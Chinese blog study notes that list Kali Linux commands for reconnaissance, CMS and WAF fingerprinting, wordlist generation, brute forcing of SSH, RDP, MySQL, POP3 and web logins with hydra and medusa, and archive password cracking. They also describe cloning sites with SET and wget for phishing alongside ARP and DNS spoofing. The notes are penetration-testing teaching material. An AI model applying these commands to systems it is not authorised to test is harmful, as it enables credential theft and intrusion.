+<h3 id="域名信息搜集"><a href="#域名信息搜集" class="headerlink" title="域名信息搜集"></a>域名信息搜集</h3><h4 id="dnsenum-fierce-snmpcheck"><a href="#dnsenum-fierce-snmpcheck" class="headerlink" title="dnsenum-fierce-snmpcheck"></a>dnsenum-fierce-snmpcheck</h4><p><strong>dnsenum –enum [baidu.com]</strong>  扫描子域，网段等</p>
+<p>或者</p>
+<p><strong>fierce –domain [baidu.com]</strong></p>
+<p>不同的子域上部署不同的服务，开放不同的端口，据此来寻找漏洞</p>
+<p><strong>snmpcheck -t [目标]</strong>  允许用户枚举snmp设备，<strong>简单网络管理协议</strong>专门设计用于在 IP 网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议</p>
+<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p><strong>网络测试工具</strong></p>
+<h4 id="dmitry-nmap-netdiscover-masscan"><a href="#dmitry-nmap-netdiscover-masscan" class="headerlink" title="dmitry-nmap-netdiscover-masscan"></a>dmitry-nmap-netdiscover-masscan</h4><p><strong>dmitry -help</strong></p>
+<p><strong>dmitry -wnpb [baidu.com]</strong> 参数可一起写，查询目标网站的信息</p>
+<p><strong>nmap -sP [内网主机]</strong>   不深入学nmap没用，有时候不靠谱，防火墙拦截</p>
+<p><strong>nping(nmap套件中的) -tcp -p 445(给445端口发数据包) -data AF56A43D [目标ip]</strong>   这里构造特殊data，可以刺探防火墙的反应，甚至跳过</p>
+<p>arp-scan -l  探测内网中有哪些主机存在，并且输出mac地址，并且估计是什么设备</p>
+<p><strong>netdiscover -i eth0</strong> [192.168.0.0/16 16相当于网络码占多少位，对多个网段扫描]也是使用当前网卡（ifconfig）对内网存活主机探测</p>
+<p><strong>masscan -p 1-65535 192.168.1.167 –rate=100</strong>   100是觉得对方可能有防火墙，跳过防火墙的效果</p>
+<h4 id="netbios信息搜集"><a href="#netbios信息搜集" class="headerlink" title="netbios信息搜集"></a>netbios信息搜集</h4><h5 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h5><p>通过ping计算机名可以获得东西，查到目标ip地址</p>
+<p>文件资源管理器中，映射网络驱动器时也可以直接写计算机名字跟共享用户名即可连接到对方硬盘，而且不需要知道对方电脑密码</p>
+<p>netbios协议可以实现计算机名变为ip地址之间的转换</p>
+<p><strong>nbtscan [目标ip]</strong></p>
+<p><strong>nbtscan -hv [目标ip]</strong></p>
+<hr>
+<h3 id="OS信息搜集"><a href="#OS信息搜集" class="headerlink" title="OS信息搜集"></a>OS信息搜集</h3><h4 id="nmap-p0f"><a href="#nmap-p0f" class="headerlink" title="nmap-p0f"></a>nmap-p0f</h4><p>nmap [ip]</p>
+<p>nmap -p 1-1000 [ip]</p>
+<p>nmap 192.168.1.*   </p>
+<p>nmap -O [ip]</p>
+<p><strong>p0f -f /xxx/xxx/x.pcap(先抓包获得的文件) -o haha.log（对抓包进行分析输出）</strong></p>
+<h3 id="msf框架"><a href="#msf框架" class="headerlink" title="msf框架"></a>msf框架</h3><p><strong>armitage</strong>图形化界面</p>
+<p>使用木马过程见攻击框架笔记</p>
+<h3 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h3><h4 id="wpscan-cewl-wpscan-crunch-rtgen"><a href="#wpscan-cewl-wpscan-crunch-rtgen" class="headerlink" title="wpscan-cewl-wpscan-crunch-rtgen"></a>wpscan-cewl-wpscan-crunch-rtgen</h4><p>wp站（<strong>wordpress</strong>全球用的最多的<strong>CMS</strong>）密码生成器使用</p>
+<p><strong>wpscan –url 网站</strong> 直接扫描wp站的用户名</p>
+<p><strong>cewl 网站 -w mima.txt</strong>  根据网站生成密码（这里是根据网站猜测的）</p>
+<p><strong>wpscan –url 网站 -U 用户名txt -P mima.txt</strong>  将上面的用户名和密码组合起来爆破，爆破出来后在wp-login.php中试一下登录</p>
+<p>懂原理的话可以自制别的网站的工具</p>
+<hr>
+<p><strong>crunch 2 4(生成密码的位数2到4位) 0123456789 -o /root/mima.txt</strong>  生成密码</p>
+<hr>
+<p>kali自带字典路径：<strong>usr share wordlists</strong>下</p>
+<hr>
+<p><strong>彩虹表生成</strong></p>
+<p><strong>rtgen md5 loweralpha 1 5 0 1000 1000 0</strong></p>
+<p>根据提示生成彩虹表在usr/share/rainbowcrack  可以修改其中的<strong>charset.txt</strong>文件中的参数来生成不同的彩虹表</p>
+<h3 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h3><p>大多数是CMS，修改而来</p>
+<h5 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h5><p><strong>whatweb+网址</strong> 扫描CMS，中间件，服务器，cookie，httponly，httpserver</p>
+<p>发现CMS是joomla，谷歌针对该CMS工具，kali中有joomscan的工具</p>
+<p><strong>joomscan –url [网址]</strong>  用专门的工具扫描该CMS情况，有无防火墙，后台等</p>
+<p><strong>searchsploit joomla 3.7.0</strong>  搜索对应版本的漏洞</p>
+<h4 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h4><p>web application Firewalls</p>
+<h5 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h5><p><strong>wafw00f [网址]</strong>   识别目标网站用了什么waf</p>
+<p>一般国外的waf识别的比较准，国内的比较复杂，或者魔改过了，而且用工具比较浅显，用手工确认比较靠谱</p>
+<hr>
+<h4 id="nikto敏感目录扫描"><a href="#nikto敏感目录扫描" class="headerlink" title="nikto敏感目录扫描"></a>nikto敏感目录扫描</h4><p><strong>nikto -h [目标网站] -o output.txt[默认输出到root目录下]</strong></p>
+<hr>
+<h3 id="社工SET工具"><a href="#社工SET工具" class="headerlink" title="社工SET工具"></a>社工SET工具</h3><h5 id="setoolkit"><a href="#setoolkit" class="headerlink" title="setoolkit"></a>setoolkit</h5><p>里面选择社会工程学，网站克隆，可以结合ARP欺骗DNS劫持，即使输入正确的地址也是跳转到假界面。</p>
+<p>社工获得登录名和密码</p>
+<p>但是有时候不靠谱，可以选择里面手工网站模板</p>
+<h4 id="网站下载工具"><a href="#网站下载工具" class="headerlink" title="网站下载工具"></a>网站下载工具</h4><h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><p>一种爬虫，离线搜集信息的方式，配合用来制作钓鱼网站</p>
+<p><strong>wget</strong>命令，GNU开源项目中的一部分，主流win和linux都带有，用来下载的一个工具</p>
+<p>wget [网址]  下载页面html</p>
+<p>wget -r(递归下载) -p ./test(路径)  [网址]</p>
+<p>-t 设置重试次数。当连接中断（或超时）时，wget将试图重新连接。如果指<br>定-t0，则重试次数设为无穷多。</p>
+<p>-T,–timeout=SECONDS 设置超时时间</p>
+<p>-e “http_proxy=<a href="http://127.0.0.1:8087&quot;">http://127.0.0.1:8087&quot;</a> 设置代理  https_proxy同理</p>
+<p>-c 从断点出继续下载</p>
+<p>-P 指定下载存放的目录</p>
+<h5 id="httrack"><a href="#httrack" class="headerlink" title="httrack"></a><strong>httrack</strong></h5><p>httrack [网址] 直接下载，只需要用下载目录中的网址文件夹就好了，比较好用</p>
+<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><h5 id="medusa-hydra"><a href="#medusa-hydra" class="headerlink" title="medusa-hydra"></a>medusa-hydra</h5><h4 id="medusa-服务密码破解"><a href="#medusa-服务密码破解" class="headerlink" title="medusa 服务密码破解"></a>medusa 服务密码破解</h4><p><strong>medusa</strong> -h [目标ip] -u test(用户名) -P（不知道的用大写，知道的用户名用小写u） mima.txt(root中的密码字典)  -M ftp(破解ftp协议的密码)</p>
+<h4 id="hydra-服务协议密码破解"><a href="#hydra-服务协议密码破解" class="headerlink" title="hydra 服务协议密码破解"></a>hydra 服务协议密码破解</h4><p><strong>hydra</strong>  常用，支持众多协议</p>
+<p>hydra -L [用户名字典] -P [密码字典] -t [线程] -vV（显示详细过程） -e ns（一般-e后面就加ns） [目标ip] [服务]</p>
+<p>hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV -e ns [目标ip] ssh    破解ssh  22号端口账户密码</p>
+<p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns [目标ip] http-get /admin/login.php 破解网站指定页面的登录入口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -p 密码字典 -s 80 [目标ip] http-post-form <span class="string">&quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=submit:wrong username or password&quot;</span>  <span class="comment">#对于post提交的页面</span></span><br></pre></td></tr></table></figure>
+
+<p>hydra -l 用户名 -p 密码字典 xxx.pop3.mail pop3 破解pop3邮件</p>
+<p>hydra -l boris(用户名) -P /usr/share/wordlists/fasttrack.txt 192.168.1.160 -s 55007（实验时非默认端口） pop3</p>
+<p>远程桌面破解</p>
+<p>hydra [目标ip] rdp -l administrator（一般win默认用户名） -P密码字典 -V</p>
+<p>mysql密码</p>
+<p>hydra -l root(mysql默认用户名) -p 密码字典 -e ns [目标ip] mysql  可以直接在网上破解3306端口</p>
+<h4 id="rar文件破解"><a href="#rar文件破解" class="headerlink" title="rar文件破解"></a>rar文件破解</h4><h5 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h5><p>kali中没有，apt-get install rarcrack 安装</p>
+<p>rarcrack –type rar –threads 8 a.rar</p>
+<p>破解a.rar的压缩包，提前先在a.rar目录下创建一个a.rar.xml的文件（新版kali不需要，会自动生成）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;rarcrack&gt;</span></span><br><span class="line"><span class="meta">&lt;abc&gt;0123456789&lt;/abc&gt; 字符范围</span></span><br><span class="line"><span class="meta">&lt;current&gt;0000&lt;/current&gt; 从0000开始猜</span></span><br><span class="line"><span class="meta">&lt;good_password/&gt;</span></span><br><span class="line"><span class="meta">&lt;/rarcrack&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="zip文件破解"><a href="#zip文件破解" class="headerlink" title="zip文件破解"></a>zip文件破解</h4><h5 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h5><p>fcrackzip -b -c[密码类型] -l 1-4（长度） -u [文件名.zip] -v </p>
+<p> -c 密码类型： a=a-z      1=0-9   A=A-Z  l=特殊字符</p>
+<p>fcrackzip -b -c1 -l 1-4 -u b.zip -v</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">XiaoYao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://w4xiaoyao.top/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kali%E5%AE%8C%E5%85%A8%E6%94%BB%E7%95%A5/">https://w4xiaoyao.top/2023/03/30/学习笔记/kali完全攻略/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kali/">kali</a><a class="post-meta__tags" href="/tags/tools/">tools</a></div><div class="post_share"><div class="social-share" data-image="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/015.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Linux%E5%86%85%E6%A0%B8%E8%B7%AF%E7%94%B1%E8%A1%A8/"><img class="prev-cover" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/015.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Linux内核路由表</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Js%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"><img class="next-cover" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/003.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Js基础语法</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Waline</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img_struct4blog/profile_knife.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">XiaoYao</div><div class="author-info__description">多巴胺被赐予意义，人类社会便有了混沌，愿世间尚有净土，留存爱与欢喜。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">68</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Liloker"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Liloker" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:theone@liloker.anonaddy.me" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_42160117" target="_blank" title="CSDN"><i class="far fa-copyright"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">来了，随便坐吧~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">Kali基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.</span> <span class="toc-text">Linux常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">基础命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.2.2.</span> <span class="toc-text">防火墙</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEssh"><span class="toc-number">1.3.</span> <span class="toc-text">配置ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%9B%B4%E6%96%B0%E6%BA%90"><span class="toc-number">1.4.</span> <span class="toc-text">修改更新源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc-netcat"><span class="toc-number">1.5.</span> <span class="toc-text">nc(netcat)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E6%99%AE%E9%80%9A%E6%96%87%E5%AD%97"><span class="toc-number">1.5.1.</span> <span class="toc-text">发送普通文字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-number">1.5.2.</span> <span class="toc-text">远程控制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OS%E5%A4%96%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.6.</span> <span class="toc-text">OS外的信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%99%A8nmap"><span class="toc-number">1.6.1.</span> <span class="toc-text">扫描器nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E9%AB%98nmap%E6%89%AB%E6%8F%8F%E6%95%88%E7%8E%87"><span class="toc-number">1.6.2.</span> <span class="toc-text">提高nmap扫描效率</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">Kali工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">域名信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dnsenum-fierce-snmpcheck"><span class="toc-number">2.1.1.</span> <span class="toc-text">dnsenum-fierce-snmpcheck</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">内网信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dmitry-nmap-netdiscover-masscan"><span class="toc-number">2.2.1.</span> <span class="toc-text">dmitry-nmap-netdiscover-masscan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netbios%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.2.2.</span> <span class="toc-text">netbios信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#nbtscan"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">nbtscan</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OS%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">OS信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap-p0f"><span class="toc-number">2.3.1.</span> <span class="toc-text">nmap-p0f</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%A1%86%E6%9E%B6"><span class="toc-number">2.4.</span> <span class="toc-text">msf框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90"><span class="toc-number">2.5.</span> <span class="toc-text">字典生成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wpscan-cewl-wpscan-crunch-rtgen"><span class="toc-number">2.5.1.</span> <span class="toc-text">wpscan-cewl-wpscan-crunch-rtgen</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.6.</span> <span class="toc-text">网站指纹识别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#whatweb"><span class="toc-number">2.6.0.1.</span> <span class="toc-text">whatweb</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WAF%E8%AF%86%E5%88%AB"><span class="toc-number">2.6.1.</span> <span class="toc-text">WAF识别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wafw00f"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">wafw00f</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nikto%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.6.2.</span> <span class="toc-text">nikto敏感目录扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5SET%E5%B7%A5%E5%85%B7"><span class="toc-number">2.7.</span> <span class="toc-text">社工SET工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#setoolkit"><span class="toc-number">2.7.0.1.</span> <span class="toc-text">setoolkit</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7"><span class="toc-number">2.7.1.</span> <span class="toc-text">网站下载工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wget"><span class="toc-number">2.7.1.1.</span> <span class="toc-text">wget</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#httrack"><span class="toc-number">2.7.1.2.</span> <span class="toc-text">httrack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.8.</span> <span class="toc-text">密码爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#medusa-hydra"><span class="toc-number">2.8.0.1.</span> <span class="toc-text">medusa-hydra</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medusa-%E6%9C%8D%E5%8A%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.8.1.</span> <span class="toc-text">medusa 服务密码破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hydra-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.8.2.</span> <span class="toc-text">hydra 服务协议密码破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rar%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.8.3.</span> <span class="toc-text">rar文件破解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rarcrack"><span class="toc-number">2.8.3.1.</span> <span class="toc-text">rarcrack</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.8.4.</span> <span class="toc-text">zip文件破解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fcrackzip"><span class="toc-number">2.8.4.1.</span> <span class="toc-text">fcrackzip</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92/" title="角动量守恒"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/010.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="角动量守恒"/></a><div class="content"><a class="title" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%A7%92%E5%8A%A8%E9%87%8F%E5%AE%88%E6%81%92/" title="角动量守恒">角动量守恒</a><time datetime="2023-03-30T13:01:15.574Z" title="Created 2023-03-30 21:01:15">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%AE%9E%E6%88%98Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="实战Linux应急响应"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/cuteworld_007.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实战Linux应急响应"/></a><div class="content"><a class="title" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%AE%9E%E6%88%98Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="实战Linux应急响应">实战Linux应急响应</a><time datetime="2023-03-30T13:01:15.574Z" title="Created 2023-03-30 21:01:15">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%A3%81%E7%BA%B8/" title="计划任务运行powershell自动获取聚焦图片并设为壁纸"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/010.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计划任务运行powershell自动获取聚焦图片并设为壁纸"/></a><div class="content"><a class="title" href="/2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E7%94%A8powershell%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E5%B9%B6%E8%AE%BE%E4%B8%BA%E5%A3%81%E7%BA%B8/" title="计划任务运行powershell自动获取聚焦图片并设为壁纸">计划任务运行powershell自动获取聚焦图片并设为壁纸</a><time datetime="2023-03-30T13:01:15.573Z" title="Created 2023-03-30 21:01:15">2023-03-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/015.jpg')">#footer-wrap
+  if theme.footer.owner.enable
+    - var now = new Date()
+    - var nowYear = now.getFullYear()
+    if theme.footer.owner.since && theme.footer.owner.since != nowYear
+      .copyright!= `&copy;${theme.footer.owner.since} - ${nowYear} By ${config.author}`
+    else
+      .copyright!= `&copy;${nowYear} By ${config.author}`
+  if theme.footer.copyright
+    .framework-info
+      span= _p('footer.framework') + ' '
+      a(href='https://hexo.io')= 'Hexo'
+      span.footer-separator |
+      span= _p('footer.theme') + ' '
+      a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'
+  if theme.footer.custom_text
+    .footer_custom_text!=`${theme.footer.custom_text}`
+</footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RYm4g1Khr0F0wyTlik3kI2We-MdYXbMMI',
+      appKey: 'u9VLeiSQuTLpO2mWRAMlYrKX',
+      placeholder: '随便说两句吧~',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
